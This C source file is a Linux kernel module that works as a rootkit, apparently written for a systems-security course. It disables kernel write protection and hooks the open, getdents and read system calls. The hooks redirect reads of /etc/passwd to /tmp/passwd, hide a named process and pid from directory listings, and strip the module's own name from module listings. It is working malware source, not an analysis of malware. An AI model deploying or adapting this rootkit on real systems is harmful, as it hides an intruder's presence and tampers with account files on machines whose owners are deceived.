#include <asm/cacheflush.h>
#include <asm/current.h>  // process information
#include <asm/page.h>
#include <asm/unistd.h>     // for system call constants
#include <linux/highmem.h>  // for changing page permissions
#include <linux/init.h>     // for entry/exit macros
#include <linux/kallsyms.h>
#include <linux/kernel.h>  // for printk and other kernel bits
#include <linux/module.h>  // for all modules
#include <linux/sched.h>

//pass parameter of pid
static char * mypid = "";
module_param(mypid, charp, 0);
MODULE_PARM_DESC(mypid, "My process id");
//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))
#define BUFFLEN 1024
//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page * page,
		 int numpages) = (void *)0xffffffff81073190;  //need to be changed
void (*pages_ro)(struct page * page,
		 int numpages) = (void *)0xffffffff81073110;  //need to be changed

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long * sys_call_table = (unsigned long *)0xffffffff81a00280;

struct linux_dirent {
  u64 d_ino;
  s64 d_off;
  unsigned short d_reclen;
  char d_name[BUFFLEN];
};

static bool proc = false;
//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_call_open)(const char * pathname, int flags);
//Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char * pathname, int flags) {
  char * original_pathname = "/etc/passwd";
  char * modified_pathname = "/tmp/passwd";
  if (strcmp(pathname, original_pathname) == 0) {
    printk(KERN_INFO "Very, very Sneaky!\n");
    printk(KERN_INFO "Mypid is %s\n", mypid);

    copy_to_user((void *)pathname, modified_pathname, strlen(modified_pathname));
  }
    else {
    proc = true;
  }
  return original_call_open(pathname, flags);
}


asmlinkage int (*original_call_getdents)(unsigned int fd,
					 struct linux_dirent * buf,
					 unsigned int bufSize);

asmlinkage int sneaky_sys_getdents(unsigned int fd,
				   struct linux_dirent * buf,
				   unsigned int bufSize) {
  int nread;
  struct linux_dirent * d;
  int bpos;
  nread = original_call_getdents(fd, buf, bufSize);
  for (bpos = 0; bpos < nread;) {
    d = (struct linux_dirent *)((char *)buf + bpos);
    if (strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, mypid) == 0) {
      const void * src = (char *)d + d->d_reclen;
      int n = (char *)buf + nread - (char *)d - d->d_reclen;
      memmove(d, src, n);
      nread -= d->d_reclen;
      break;
    }
    bpos += d->d_reclen;
  }
  return nread;
}

asmlinkage ssize_t (*original_call_read)(int fd, void * buf, size_t bufSize);
asmlinkage ssize_t sneaky_sys_read(int fd, void * buf, size_t bufSize) {
  ssize_t nread = original_call_read(fd, buf, bufSize);
  if (nread > 0) {
    char * sneak_pos = strnstr(buf, "sneaky_mod", nread);
    if (sneak_pos != NULL) {
      char * sneak_end = strnstr(sneak_pos, "\n", nread);
      if (sneak_end != NULL) {
	if (proc == true) {
	  ssize_t n = nread + (char *)buf - sneak_pos - (sneak_end - sneak_pos + 1);
	  memmove(sneak_pos, sneak_end + 1, n);
	  nread -= (sneak_end - sneak_pos + 1);
	  proc = false;
	}
      }
    }
  }
  return nread;
}

//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
  struct page * page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  original_call_open = (void *)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
  original_call_getdents = (void *)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
  original_call_read = (void *)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0;  // to show a successful load
}

static void exit_sneaky_module(void) {
  struct page * page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_call_open;
  *(sys_call_table + __NR_getdents) = (unsigned long)original_call_getdents;
  *(sys_call_table + __NR_read) = (unsigned long)original_call_read;
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}

module_init(initialize_sneaky_module);  // what's called upon loading
module_exit(exit_sneaky_module);        // what's called upon unloading
MODULE_LICENSE("GPL");
